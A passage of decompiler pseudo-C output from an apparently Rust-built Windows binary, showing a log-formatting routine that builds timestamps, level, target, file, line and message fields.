*v115; // rax\n  bool v116; // zf\n  char *v117; // rcx\n  __int64 v118; // rax\n  char **v119; // rax\n  __int64 v120; // r15\n  _BYTE *v121; // rsi\n  char v122; // dl\n  char v123; // bl\n  char *v124; // rdi\n  char v125; // al\n  __int64 v126; // rdx\n  char v127; // al\n  __int64 v128; // rdx\n  __int64 v129; // rsi\n  __int64 v130; // rdx\n  char v131; // bl\n  __int64 v132; // rcx\n  char v133; // dl\n  char v135; // [rsp+47h] [rbp-171h]\n  char v136; // [rsp+47h] [rbp-171h]\n  __int64 v137; // [rsp+48h] [rbp-170h]\n  __int64 v138; // [rsp+50h] [rbp-168h]\n  unsigned int v139; // [rsp+58h] [rbp-160h]\n  __int64 v140; // [rsp+58h] [rbp-160h]\n  __int64 v141; // [rsp+58h] [rbp-160h]\n  int v142; // [rsp+5Ch] [rbp-15Ch]\n  __int128 v143; // [rsp+60h] [rbp-158h] BYREF\n  __int64 v144; // [rsp+70h] [rbp-148h]\n  void (__fastcall __noreturn *v145)(); // [rsp+78h] [rbp-140h]\n  __int128 v146; // [rsp+80h] [rbp-138h] BYREF\n  __int64 v147; // [rsp+90h] [rbp-128h]\n  __int128 v148; // [rsp+98h] [rbp-120h]\n  __int64 v149; // [rsp+A8h] [rbp-110h]\n  char v150; // [rsp+B0h] [rbp-108h]\n  unsigned __int64 v151; // [rsp+B8h] [rbp-100h]\n  unsigned int v152; // [rsp+C4h] [rbp-F4h]\n  _BYTE v153[12]; // [rsp+C8h] [rbp-F0h] BYREF\n  unsigned __int16 v154; // [rsp+D4h] [rbp-E4h]\n  unsigned __int8 v155; // [rsp+D6h] [rbp-E2h]\n  __int64 v156; // [rsp+D8h] [rbp-E0h]\n  __int64 v157; // [rsp+E0h] [rbp-D8h]\n  unsigned __int64 v158; // [rsp+E8h] [rbp-D0h]\n  __int128 *v159; // [rsp+F0h] [rbp-C8h] BYREF\n  __int64 (__fastcall *v160)(); // [rsp+F8h] [rbp-C0h]\n  __m128i *v161; // [rsp+100h] [rbp-B8h]\n  __int64 v162; // [rsp+108h] [rbp-B0h]\n  __int64 v163; // [rsp+110h] [rbp-A8h]\n  __int64 v164; // [rsp+118h] [rbp-A0h]\n  __int128 v165; // [rsp+120h] [rbp-98h] BYREF\n  __int64 *v166; // [rsp+130h] [rbp-88h]\n  __int64 v167; // [rsp+138h] [rbp-80h]\n  __int128 *v168; // [rsp+140h] [rbp-78h]\n  __int64 v169; // [rsp+148h] [rbp-70h]\n  _QWORD *v170; // [rsp+158h] [rbp-60h]\n  char *v171; // [rsp+160h] [rbp-58h] BYREF\n  __int64 v172; // [rsp+168h] [rbp-50h]\n  __int64 v173; // [rsp+170h] [rbp-48h]\n\n  if ( a2[6] > *(_QWORD *)(a1 + 176) )\n  {\n    v2 = 0i64;\n    return sub_140029C3D(v2);\n  }\n  v4 = a1;\n  v158 = a2[6];\n  v5 = (void *)a2[7];\n  v6 = a2[8];\n  v7 = sub_14002B526((__int64 *)(a1 + 120));\n  if ( !v8 )\n  {\nLABEL_9:\n    v13 = sub_14002B526((__int64 *)(v4 + 144));\n    if ( v14 )\n    {\n      v15 = v13;\n      v16 = 24 * v14;\n      v2 = 0i64;\n      while ( v16 )\n      {\n        v17 = *(const void **)v15;\n        if ( !*(_QWORD *)v15 )\n          v17 = *(const void **)(v15 + 8);\n        v18 = *(_QWORD *)(v15 + 16);\n        v15 += 24i64;\n        v16 -= 24i64;\n        if ( sub_14004AA9F(v5, v6, v17, v18) )\n          return sub_140029C3D(v2);\n      }\n    }\n    v170 = a2;\n    sub_1400131CF((__int64)&v146, v4 + 184);\n    v19 = sub_140029BF5((__int64)&v146, (__int64)&off_1400697D0);\n    v22 = v21;\n    v23 = (_QWORD *)(v19 + 96);\n    v24 = v158;\n    v25 = 16i64;\n    v26 = 96i64;\n    if ( v158 == 1 )\n    {\n      v26 = 16i64;\n      v23 = (_QWORD *)(v19 + 16);\n    }\n    v27 = *(_DWORD *)(v4 + 4 * v158 + 96);\n    v137 = (__int64)v23;\n    if ( *(_QWORD *)(v4 + 56) - 1i64 >= v158 )\n      goto LABEL_135;\n    v156 = v4;\n    v162 = v26;\n    v135 = v22;\n    *(_QWORD *)&v146 = 0i64;\n    off_140087050(&v146);\n    v28 = v146 - 116444736000000000i64;\n    if ( (__int64)v146 < 116444736000000000i64 )\n      v28 = 116444736000000000i64 - v146;\n    v29 = v28 / 0x989680;\n    v30 = 100 * (v28 % 0x989680);\n    v31 = v28 / 0x861C46800i64 % 0x18;\n    v138 = v19;\n    v152 = v27;\n    if ( (__int64)v146 >= 116444736000000000i64 )\n    {\n      sub_14004D5D8((__int64)&v146, v28 / 0xC92A69C000i64 + 2440588);\n      v35 = sub_14004D8CB((unsigned int *)&v146, (__int64)&unk_14006DF88, 32i64, (__int64)&off_14006DFA8);\n      v36 = (v31 << 48) | ((v28 / 0x23C34600 % 0x3C) << 40) | ((v29 % 0x3C) << 32) | v30;\n      WORD6(v146) = 0;\n      BYTE14(v146) = 0;\n      v23 = (_QWORD *)v137;\n      v4 = v156;\n      goto LABEL_35;\n    }\n    v32 = 0;\n    v33 = v29 % 0x3C;\n    v34 = v28 / 0x23C34600 % 0x3C;\n    if ( v28 % 0x989680 )\n    {\n      v32 = 1000000000 - v30;\n      LOBYTE(v33) = ~(_BYTE)v33;\n      v4 = v156;\n    }\n    else\n    {\n      LOBYTE(v33) = -(char)v33;\n      v4 = v156;\n      if ( !(_BYTE)v33 )\n      {\n        v32 = 0;\n        v37 = -(char)v34;\n        if ( !v37 )\n        {\n          v32 = 0;\n          v38 = -(char)v31;\n          v151 = v33;\n          if ( !v38 )\n          {\n            v139 = 0;\n            v39 = 0i64;\n            goto LABEL_29;\n          }\nLABEL_28:\n          v139 = v32;\n          v39 = (unsigned __int64)(unsigned __int8)(v38 + 24) << 48;\nLABEL_29:\n          sub_14004D5D8((__int64)&v146, 2440588 - v28 / 0xC92A69C000i64);\n          v35 = sub_14004D8CB(\n                  (unsigned int *)&v146,\n                  (__int64)\"overflow subtracting duration from date\",\n                  39i64,\n                  (__int64)&off_14006DFE8);\n          v40 = v38 < 0;\n          v23 = (_QWORD *)v137;\n          v41 = v139;\n          if ( v40 )\n          {\n            if ( (v35 & 0x1FF) == 1 )\n            {\n              if ( v35 == -5119487 )\n                sub_14005E230((__int64)\"resulting value is out of range\", 31i64, (__int64)&off_14006DE78);\n              v35 = (unsigned __int16)sub_14004DB13((v35 >> 9) - 1) | (((v35 >> 9) - 1) << 9);\n              v41 = v139;\n            }\n            else\n            {\n              --v35;\n            }\n          }\n          v36 = ((unsigned __int64)v37 << 40) | v39 | ((unsigned __int64)(unsigned __int8)v151 << 32) | v41;\n          BYTE14(v146) = 0;\n          WORD6(v146) = 0;\nLABEL_35:\n          LODWORD(v146) = v35;\n          *(_QWORD *)((char *)&v146 + 4) = v36;\n          sub_14004D25C(\n            (__int64)v153,\n            (__int64)&v146,\n            *(unsigned __int16 *)(v4 + 171) | (*(unsigned __int8 *)(v4 + 173) << 16));\n          v43 = *(_QWORD *)(v4 + 32);\n          v22 = v135;\n          if ( v43 )\n          {\n            if ( (_DWORD)v43 != 1 )\n            {\n              sub_14002B473(\n                &v143,\n                *(_QWORD *)(v4 + 40),\n                *(_QWORD *)(v4 + 48),\n                (__int64)v23,\n                *(int *)v153,\n                *(__int64 *)&v153[4],\n                (v155 << 24) + (v154 << 8) + 1);\n              if ( (_QWORD)v143 == 3i64 )\n              {\nLABEL_133:\n                *(_QWORD *)&v146 = &off_140069650;\n                *((_QWORD *)&v146 + 1) = 1i64;\n                v147 = (__int64)&off_14006E000;\n                v148 = 0i64;\n                v2 = sub_140027565((__int64)v23, &v146);\n                v19 = v138;\n                if ( v2 )\n                  goto LABEL_221;\n                v24 = v158;\n                v26 = v162;\n                v27 = v152;\nLABEL_135:\n                if ( *(_QWORD *)(v4 + 64) - 1i64 >= v24 )\n                  goto LABEL_156;\n                v116 = *(_BYTE *)(v4 + 168) == 0;\n                v162 = v26;\n                if ( v116 )\n                {\n                  BYTE10(v165) = 11;\n                  LODWORD(v165) = 0;\n                  WORD2(v165) = 256;\n                  v152 = v27;\n                  *(_DWORD *)((char *)&v165 + 6) = v27;\n                  v102 = *(_QWORD *)(v19 + v26);\n                  if ( (*(_DWORD *)(v19 + v26) & 0xFFFFFFFE) != 4 )\n                  {\n                    v2 = (__int64)sub_140027EA6(v23);\n                    if ( v2 )\n                      goto LABEL_221;\n                    v102 = *(_QWORD *)(v19 + v162);\n                  }\n                  v103 = 2i64;\n                  if ( (unsigned __int64)(v102 - 4) < 2 )\n                    v103 = v102 - 4;\n                  if ( v103 )\n                  {\n                    if ( v103 != 1 )\n                    {\n                      switch ( v102 )\n                      {\n                        case 0i64:\n                          v112 = sub_1400380C0(v23 + 1);\n                          goto LABEL_206;\n                        case 1i64:\n                          sub_1400387A0(v23 + 1);\n                          goto LABEL_207;\n                        case 2i64:\n                          v112 = sub_14002A743((__int64)(v23 + 1));\n                          goto LABEL_206;\n                        case 3i64:\n                          v112 = sub_14002A71D((__int64)(v23 + 1));\nLABEL_206:\n                          v2 = (__int64)v112;\n                          if ( v112 )\n                            goto LABEL_221;\nLABEL_207:\n                          v136 = v22;\n                          v120 = v19;\n                          sub_1400131CF((__int64)&v146, (__int64)(v23 + 6));\n                          v121 = (_BYTE *)sub_1400275D9((__int64)&v146, (__int64)&off_1400693D0);\n                          v123 = v122;\n                          v124 = v121 + 9;\n                          if ( (_BYTE)v152 == 11\n                            || (v125 = sub_14004AA3A(v152, 0), v125 == 2)\n                            || (v121[16] = v126, v121[14] = v125 & 1, (v2 = sub_14004E1C3(v124, v126)) == 0) )\n                          {\n                            v2 = 0i64;\n                            if ( BYTE10(v165) != 11 )\n                            {\n                              v127 = sub_14004AA3A(*(unsigned int *)((char *)&v165 + 10), 0);\n                              if ( v127 != 2 )\n                              {\n                                v121[17] = v128;\n                                v121[15] = v127 & 1;\n                                v2 = sub_14004E1C3(v124, v128);\n                              }\n                            }\n                          }\n                          sub_14000DEB6((__int64)v121, v123);\n                          v19 = v120;\n                          v22 = v136;\n                          v23 = (_QWORD *)v137;\n                          if ( !v2 )\n                            goto LABEL_214;\n                          goto LABEL_221;\n                      }\n                    }\n                    v2 = (__int64)sub_1400275C7(v23 + 1);\n                    if ( v2 )\n                      goto LABEL_221;\n                    if ( (_BYTE)v152 != 11 )\n                    {\n                      v2 = (__int64)sub_140027621(v23 + 1, 1, (_BYTE *)&v165 + 6, 0);\n                      if ( v2 )\n                        goto LABEL_221;\n                    }\n                  }\nLABEL_214:\n                  v24 = v158;\n                }\n                if ( *(_BYTE *)(v4 + 169) )\n                {\n                  if ( *(_BYTE *)(v4 + 169) != 1 )\n                  {\n                    v159 = (__int128 *)v24;\n                    v104 = (__int64 *)&v146;\n                    *(_QWORD *)&v146 = &off_140069668;\n                    *((_QWORD *)&v146 + 1) = 2i64;\n                    *(_QWORD *)&v165 = &v159;\n                    *((_QWORD *)&v165 + 1) = sub_140009C96;\n                    v147 = (__int64)&v165;\n                    v148 = 1ui64;\n                    goto LABEL_154;\n                  }\n                  *(_QWORD *)v153 = v24;\n                  v159 = (__int128 *)v153;\n                  *(_QWORD *)&v146 = 2i64;\n                  v147 = 0i64;\n                  v148 = 5ui64;\n                  v160 = sub_140009C96;\n                  v149 = 32i64;\n                  v150 = 0;\n                }\n                else\n                {\n                  *(_QWORD *)v153 = v24;\n                  v159 = (__int128 *)v153;\n                  *(_QWORD *)&v146 = 2i64;\n                  v147 = 0i64;\n                  v148 = 5ui64;\n                  v160 = sub_140009C96;\n                  v149 = 32i64;\n                  v150 = 1;\n                }\n                v104 = (__int64 *)&v165;\n                *(_QWORD *)&v165 = &off_140069668;\n                *((_QWORD *)&v165 + 1) = 2i64;\n                v168 = &v146;\n                v169 = 1i64;\n                v166 = (__int64 *)&v159;\n                v167 = 1i64;\nLABEL_154:\n                sub_140029C94((__m128i **)&v143, v104);\n                *(_QWORD *)&v165 = &v143;\n                *(_QWORD *)&v146 = &off_140069688;\n                *((_QWORD *)&v146 + 1) = 2i64;\n                *((_QWORD *)&v165 + 1) = sub_14000DD63;\n                v147 = (__int64)&v165;\n                v148 = 1ui64;\n                v2 = sub_140027565((__int64)v23, &v146);\n                sub_14004CFA0((void *)v143, *((__int64 *)&v143 + 1));\n                v24 = v158;\n                if ( v2 )\n                  goto LABEL_221;\n                if ( !*(_BYTE *)(v4 + 168) )\n                {\n                  v111 = *(_QWORD *)(v19 + v162);\n                  v26 = v111 - 4;\n                  v25 = 2i64;\n                  if ( (unsigned __int64)(v111 - 4) < 2 )\n                    v25 = v111 - 4;\n                  if ( v25 )\n                  {\n                    if ( v25 == 1 )\n                    {\n                      v2 = (__int64)sub_1400275C7(v23 + 1);\n                    }\n                    else\n                    {\n                      switch ( v111 )\n                      {\n                        case 0i64:\n                          v119 = sub_1400380C0(v23 + 1);\n                          goto LABEL_218;\n                        case 1i64:\n                          sub_1400387A0(v23 + 1);\n                          goto LABEL_219;\n                        case 2i64:\n                          v119 = sub_14002A743((__int64)(v23 + 1));\n                          goto LABEL_218;\n                        case 3i64:\n                          v119 = sub_14002A71D((__int64)(v23 + 1));\nLABEL_218:\n                          v2 = (__int64)v119;\n                          if ( v119 )\n                            goto LABEL_221;\nLABEL_219:\n                          sub_1400131CF((__int64)&v146, (__int64)(v23 + 6));\n                          v129 = sub_1400275D9((__int64)&v146, (__int64)&off_1400693B8);\n                          v131 = v130;\n                          *(_DWORD *)(v129 + 14) = *(_DWORD *)(v129 + 10);\n                          v2 = sub_14004E1C3((char *)(v129 + 9), v130);\n                          v132 = v129;\n                          v24 = v158;\n                          v133 = v131;\n                          v23 = (_QWORD *)v137;\n                          sub_14000DEB6(v132, v133);\n                          break;\n                      }\n                    }\n                    if ( v2 )\n                      goto LABEL_221;\n                  }\n                }\nLABEL_156:\n                if ( *(_QWORD *)(v4 + 72) - 1i64 >= v24 )\n                  goto LABEL_179;\n                v105 = *(_BYTE *)(v4 + 170);\n                if ( !v105 )\n                {\n                  v23 = (_QWORD *)v137;\n                  v2 = sub_14002A1DB(v137, *(_QWORD *)v4, *(_QWORD *)(v4 + 8));\n                  if ( v2 )\n                    goto LABEL_221;\nLABEL_179:\n                  if ( *(_QWORD *)(v4 + 80) - 1i64 >= v24 )\n                    goto LABEL_187;\n                  v113 = *(_QWORD *)(v4 + 16);\n                  if ( v113 )\n                  {\n                    if ( (_DWORD)v113 != 1 )\n                    {\n                      *(_QWORD *)&v165 = v5;\n                      *((_QWORD *)&v165 + 1) = v6;\n                      *(_QWORD *)&v143 = &v165;\n                      v114 = &v146;\n                      *(_QWORD *)&v146 = &off_14006BE98;\n                      *((_QWORD *)&v146 + 1) = 2i64;\n                      *((_QWORD *)&v143 + 1) = sub_1400249C5;\n                      v147 = (__int64)&v143;\n                      v148 = 1ui64;\nLABEL_186:\n                      v2 = sub_140027565((__int64)v23, v114);\n                      if ( v2 )\n                        goto LABEL_221;\nLABEL_187:\n                      if ( *(_QWORD *)(v4 + 88) - 1i64 >= v24 )\n                        goto LABEL_199;\n                      if ( v170[3] == 2i64 )\n                        v115 = 0i64;\n                      else\n                        v115 = (char *)v170[4];\n                      v116 = v115 == 0i64;\n                      v117 = \"<unknown>\";\n                      if ( v115 )\n                        v117 = v115;\n                      v118 = 9i64;\n                      if ( !v116 )\n                        v118 = v170[5];\n                      *(_QWORD *)&v143 = v117;\n                      *((_QWORD *)&v143 + 1) = v118;\n                      if ( *((_DWORD *)v170 + 18) )\n                      {\n                        LODWORD(v159) = *((_DWORD *)v170 + 19);\n                        *(_QWORD *)&v165 = &v143;\n                        *((_QWORD *)&v165 + 1) = sub_1400249C5;\n                        v166 = (__int64 *)&v159;\n                        *(_QWORD *)&v146 = &off_1400696B0;\n                        *((_QWORD *)&v146 + 1) = 3i64;\n                        v167 = (__int64)sub_140003EC0;\n                        v147 = (__int64)&v165;\n                        v148 = 2ui64;\n                      }\n                      else\n                      {\n                        *(_QWORD *)&v165 = &v143;\n                        *(_QWORD *)&v146 = &off_1400696F0;\n                        *((_QWORD *)&v146 + 1) = 2i64;\n                        *((_QWORD *)&v165 + 1) = sub_1400249C5;\n                        v147 = (__int64)&v165;\n                        v148 = 1ui64;\n                      }\n                      v2 = sub_140027565((__int64)v23, &v146);\n                      if ( !v2 )\n                      {\nLABEL_199:\n                        *(_QWORD *)&v143 = v170 + 10;\n                        *(_QWORD *)&v165 = &v143;\n                        *(_QWORD *)&v146 = &off_140069710;\n                        *((_QWORD *)&v146 + 1) = 2i64;\n                        *((_QWORD *)&v165 + 1) = sub_14002A68F;\n                        v147 = (__int64)&v165;\n                        v148 = 1ui64;\n                        v2 = sub_140027565((__int64)v23, &v146);\n                        if ( !v2 )\n                          v2 = (__int64)sub_140027EA6(v23);\n                      }\n                      goto LABEL_221;\n                    }\n                    *(_QWORD *)v153 = *(_QWORD *)(v4 + 24);\n                    v159 = (__int128 *)v5;\n                    v160 = (__int64 (__fastcall *)())v6;\n                    *(_QWORD *)&v143 = &v159;\n                    *((_QWORD *)&v143 + 1) = sub_1400249C5;\n                    v144 = (__int64)v153;\n                    *(_QWORD *)&v146 = 2i64;\n                    v147 = 1i64;\n                    v148 = 1ui64;\n                    v145 = sub_140002560;\n                    v149 = 32i64;\n                    v150 = 0;\n                  }\n                  else\n                  {\n                    *(_QWORD *)v153 = *(_QWORD *)(v4 + 24);\n                    v159 = (__int128 *)v5;\n                    v160 = (__int64 (__fastcall *)())v6;\n                    *(_QWORD *)&v143 = &v159;\n                    *((_QWORD *)&v143 + 1) = sub_1400249C5;\n                    v144 = (__int64)v153;\n                    *(_QWORD *)&v146 = 2i64;\n                    v147 = 1i64;\n                    v148 = 1ui64;\n                    v145 = sub_140002560;\n                    v149 = 32i64;\n                    v150 = 1;\n                  }\n                  v114 = &v165;\n                  *(_QWORD *)&v165 = &off_14006BE98;\n                  *((_QWORD *)&v165 + 1) = 2i64;\n                  v168 = &v146;\n                  v169 = 1i64;\n                  v166 = (__int64 *)&v143;\n                  v167 = 2i64;\n                  goto LABEL_186;\n                }\n                v106 = sub_14002E5D0(v25, v26, v20);\n                v171 = v106;\n                v107 = *((_QWORD *)v106 + 3);\n                if ( v107 )\n                {\n                  v108 = (__int64 (__fastcall *)())(*((_QWORD *)v106 + 4) - 1i64);\n                  v159 = (__int128 *)v107;\n                  v160 = v108;\n                  if ( *(_QWORD *)v4 )\n                  {\n                    v23 = (_QWORD *)v137;\n                    if ( (unsigned int)*(_QWORD *)v4 == 1 )\n                    {\n                      *(_QWORD *)v153 = *(_QWORD *)(v4 + 8);\n                      *(_QWORD *)&v143 = &v159;\n                      *((_QWORD *)&v143 + 1) = sub_1400249C5;\n                      v144 = (__int64)v153;\n                      *(_QWORD *)&v146 = 2i64;\n                      v147 = 1i64;\n                      v148 = 1ui64;\n                      v145 = sub_140002560;\n                      v149 = 32i64;\n                      v150 = 0;\n                      v109 = &v165;\n                      *(_QWORD *)&v165 = &off_140069808;\n                      *((_QWORD *)&v165 + 1) = 2i64;\n                      v168 = &v146;\n                      v169 = 1i64;\n                      v166 = (__int64 *)&v143;\n                      v167 = 2i64;\n                    }\n                    else\n                    {\n                      *(_QWORD *)&v165 = &v159;\n                      v109 = &v146;\n                      *(_QWORD *)&v146 = &off_140069808;\n                      *((_QWORD *)&v146 + 1) = 2i64;\n                      *((_QWORD *)&v165 + 1) = sub_1400249C5;\n                      v147 = (__int64)&v165;\n                      v148 = 1ui64;\n                    }\n                  }\n                  else\n                  {\n                    *(_QWORD *)v153 = *(_QWORD *)(v4 + 8);\n                    *(_QWORD *)&v143 = &v159;\n                    *((_QWORD *)&v143 + 1) = sub_1400249C5;\n                    v144 = (__int64)v153;\n                    *(_QWORD *)&v146 = 2i64;\n                    v147 = 1i64;\n                    v148 = 1ui64;\n                    v145 = sub_140002560;\n                    v149 = 32i64;\n                    v150 = 1;\n                    v109 = &v165;\n                    *(_QWORD *)&v165 = &off_140069808;\n                    *((_QWORD *)&v165 + 1) = 2i64;\n                    v168 = &v146;\n                    v169 = 1i64;\n                    v166 = (__int64 *)&v143;\n                    v167 = 2i64;\n                    v23 = (_QWORD *)v137;\n                  }\n                  v110 = sub_140027565((__int64)v23, v109);\n                }\n                else\n                {\n                  v116 = v105 == 2;\n                  v23 = (_QWORD *)v137;\n                  if ( !v116 )\n                  {\nLABEL_178:\n                    sub_140029DE8((__int64 *)&v171);\n                    goto LABEL_179;\n                  }\n                  v110 = sub_14002A1DB(v137, *(_QWORD *)v4, *(_QWORD *)(v4 + 8));\n                }\n                v2 = v110;\n                if ( v110 )\n                {\n                  sub_140029DE8((__int64 *)&v171);\n                  goto LABEL_221;\n                }\n                goto LABEL_178;\n              }\n              v19 = v138;\n              if ( (_QWORD)v143 == 2i64 )\n                goto LABEL_64;\n              goto LABEL_96;\n            }\n            v44 = *(_DWORD *)v153;\n            v45 = *(_QWORD *)&v153[4];\n            v46 = v155;\n            v47 = v154;\n            sub_14002A4C4(0i64, v42);\n            v140 = v45;\n            if ( (v45 & 0x100000000000000i64) == 0 )\n            {\n              sub_14002A4C4(0i64, v48);\n              sub_14002A4C4(0i64, v49);\n              if ( (unsigned int)v44 >= 0x4E2000 )\n              {\n                *(_QWORD *)&v143 = 1i64;\n                *((_QWORD *)&v143 + 1) = \"year/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n                v144 = 4i64;\n              }\n              else\n              {\n                v50 = (v46 << 16) | v47;\n                if ( (v50 & 0xFF0000) == 0 )\n                {\n                  sub_14002690A(&v146, v137, v44 >> 9);\n                  if ( (_QWORD)v146 )\n                  {\n                    *((_QWORD *)&v143 + 1) = *((_QWORD *)&v146 + 1);\n                    *(_QWORD *)&v143 = 2i64;\n                    v19 = v138;\nLABEL_64:\n                    v2 = *((_QWORD *)&v143 + 1);\n                    goto LABEL_221;\n                  }\n                  v65 = *((_QWORD *)&v146 + 1);\n                  sub_1400264A7(\n                    (__int64 *)&v146,\n                    v137,\n                    (__m128i *)\"-offset_secondyear/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\",\n                    1ui64);\n                  if ( (_QWORD)v146 )\n                    goto LABEL_63;\n                  v151 = v65;\n                  v66 = *((_QWORD *)&v146 + 1);\n                  v67 = sub_14004D709(v44);\n                  v69 = v68;\n                  sub_1400263A6(&v146, v137, v67);\n                  if ( (_QWORD)v146 )\n                    goto LABEL_63;\n                  v157 = v66;\n                  v70 = *((_QWORD *)&v146 + 1);\n                  sub_1400264A7(\n                    (__int64 *)&v146,\n                    v137,\n                    (__m128i *)\"-offset_secondyear/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\",\n                    1ui64);\n                  if ( (_QWORD)v146 )\n                    goto LABEL_63;\n                  v164 = v70;\n                  v161 = (__m128i *)\"-offset_secondyear/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n                  v71 = *((_QWORD *)&v146 + 1);\n                  sub_1400263A6(&v146, v137, v69);\n                  if ( (_QWORD)v146 )\n                    goto LABEL_63;\n                  v72 = v71;\n                  v73 = *((_QWORD *)&v146 + 1);\n                  sub_1400264A7((__int64 *)&v146, v137, (__m128i *)\"TZ\", 1ui64);\n                  if ( (_QWORD)v146 )\n                    goto LABEL_63;\n                  v74 = *((_QWORD *)&v146 + 1);\n                  sub_1400263A6(&v146, v137, BYTE6(v45));\n                  if ( (_QWORD)v146 )\n                    goto LABEL_63;\n                  v163 = *((_QWORD *)&v146 + 1);\n                  sub_1400264A7((__int64 *)&v146, v137, (__m128i *)word_14006BF38, 1ui64);\n                  if ( (_QWORD)v146\n                    || (v75 = *((_QWORD *)&v146 + 1), sub_1400263A6(&v146, v137, BYTE5(v140)), (_QWORD)v146)\n                    || (v173 = *((_QWORD *)&v146 + 1),\n                        sub_1400264A7((__int64 *)&v146, v137, (__m128i *)word_14006BF38, 1ui64),\n                        (_QWORD)v146)\n                    || (v172 = *((_QWORD *)&v146 + 1), sub_1400263A6(&v146, v137, BYTE4(v140)), (_QWORD)v146) )\n                  {\nLABEL_63:\n                    *((_QWORD *)&v143 + 1) = *((_QWORD *)&v146 + 1);\n                    *(_QWORD *)&v143 = 2i64;\n                    v19 = v138;\n                    v22 = v135;\n                    goto LABEL_64;\n                  }\n                  v89 = *((_QWORD *)&v146 + 1) + v151 + v157 + v72 + v164 + v163 + v74 + v73 + v172 + v173 + v75;\n                  v90 = v89;\n                  if ( (_DWORD)v140 )\n                  {\n                    sub_1400264A7((__int64 *)&v146, v137, (__m128i *)\".\", 1ui64);\n                    if ( (_QWORD)v146 )\n                      goto LABEL_63;\n                    v91 = *((_QWORD *)&v146 + 1) + v89;\n                    v92 = (unsigned int)v140 / 0xA;\n                    if ( (unsigned int)v140 % 0xA )\n                    {\n                      sub_1400264FF(&v146, v137, v140);\n                    }\n                    else if ( v92 % 0xA )\n                    {\n                      sub_1400265CE(&v146, v137, v92);\n                    }\n                    else if ( (unsigned int)v140 / 0x64 % 0xA )\n                    {\n                      sub_14002669D(&v146, v137, (unsigned int)v140 / 0x64);\n                    }\n                    else if ( (unsigned int)v140 / 0x3E8 % 0xA )\n                    {\n                      sub_14002676C(&v146, v137, (unsigned int)v140 / 0x3E8);\n                    }\n                    else if ( (unsigned int)v140 / 0x2710 % 0xA )\n                    {\n                      sub_14002683B(&v146, v137, (unsigned int)v140 / 0x2710);\n                    }\n                    else if ( (unsigned int)v140 / 0x186A0 % 0xA )\n                    {\n                      sub_14002690A(&v146, v137, (unsigned int)v140 / 0x186A0);\n                    }\n                    else if ( (unsigned int)v140 / 0xF4240 % 0xA )\n                    {\n                      sub_1400269D9(&v146, v137, (unsigned int)v140 / 0xF4240);\n                    }\n                    else if ( (unsigned int)v140 / 0x989680 % 0xA )\n                    {\n                      sub_140026B77(&v146, v137, (unsigned int)v140 / 0x989680);\n                    }\n                    else\n                    {\n                      sub_140026AA8(&v146, v137, (unsigned int)v140 / 0x5F5E100);\n                    }\n                    if ( (_QWORD)v146 )\n                      goto LABEL_63;\n                    v90 = *((_QWORD *)&v146 + 1) + v91;\n                  }\n                  v98 = v50 >> 8;\n                  if ( (_BYTE)v50 )\n                  {\n                    if ( (v50 & 0x80u) != 0 )\n                    {\nLABEL_125:\n                      sub_1400264A7((__int64 *)&v146, v137, v161, 1ui64);\n                      if ( (_QWORD)v146 )\n                        goto LABEL_63;\n                      v99 = *((_QWORD *)&v146 + 1);\n                      sub_1400263A6(&v146, v137, abs8(v50));\n                      if ( (_QWORD)v146 )\n                        goto LABEL_63;\n                      v100 = *((_QWORD *)&v146 + 1);\n                      sub_1400264A7((__int64 *)&v146, v137, (__m128i *)word_14006BF38, 1ui64);\n                      if ( (_QWORD)v146 )\n                        goto LABEL_63;\n                      v101 = *((_QWORD *)&v146 + 1);\n                      sub_1400263A6(&v146, v137, abs8(v98));\n                      if ( (_QWORD)v146 )\n                        goto LABEL_63;\n                      *((_QWORD *)&v143 + 1) = *((_QWORD *)&v146 + 1) + v90 + v99 + v101 + v100;\n                      goto LABEL_132;\n                    }\n                  }\n                  else if ( !BYTE1(v50) )\n                  {\n                    sub_1400264A7((__int64 *)&v146, v137, (__m128i *)\"Z\", 1ui64);\n                    if ( (_QWORD)v146 )\n                      goto LABEL_63;\n                    *((_QWORD *)&v143 + 1) = *((_QWORD *)&v146 + 1) + v90;\n                    goto LABEL_132;\n                  }\n                  if ( (v50 & 0x8000) == 0 )\n                    v161 = (__m128i *)\"+-offset_secondyear/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\"\n                                      \"\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n                  goto LABEL_125;\n                }\n                *(_QWORD *)&v143 = 1i64;\n                *((_QWORD *)&v143 + 1) = \"offset_secondyear/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n                v144 = 13i64;\n              }\nLABEL_96:\n              v166 = (__int64 *)v144;\n              v165 = v143;\n              v159 = &v165;\n              *(_QWORD *)&v146 = &off_1400695B8;\n              *((_QWORD *)&v146 + 1) = 1i64;\n              v160 = (__int64 (__fastcall *)())sub_14004D9A8;\n              v147 = (__int64)&v159;\n              v148 = 1ui64;\n              sub_14005DD00((__int64)&v146, (__int64)&off_140069638);\n            }\n          }\n          else\n          {\n            v51 = *(_DWORD *)v153;\n            v52 = *(_QWORD *)&v153[4];\n            v53 = (char)v155;\n            v54 = v154;\n            sub_14002A4C4(0i64, v42);\n            v142 = HIDWORD(v52);\n            if ( (v52 & 0x100000000000000i64) == 0 )\n            {\n              sub_14002A4C4(0i64, v55);\n              sub_14002A4C4(0i64, v56);\n              v57 = sub_14004D709(v51);\n              if ( v51 < 972800 )\n              {\n                v93 = 4i64;\n                v94 = \"year/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\navigate.rs\";\n              }\n              else\n              {\n                LODWORD(v151) = (v53 << 16) | v54;\n                if ( (v151 & 0xFF0000) == 0 )\n                {\n                  v59 = v57;\n                  v60 = v58;\n                  v61 = 16i64 * (unsigned __int8)sub_14004D840(v51);\n                  v62 = *(__m128i **)((char *)&off_1400699E0 + v61);\n                  sub_1400264E1(\n                    (__int64)v62,\n                    *(unsigned __int64 *)((char *)&off_1400699E0 + v61 + 8),\n                    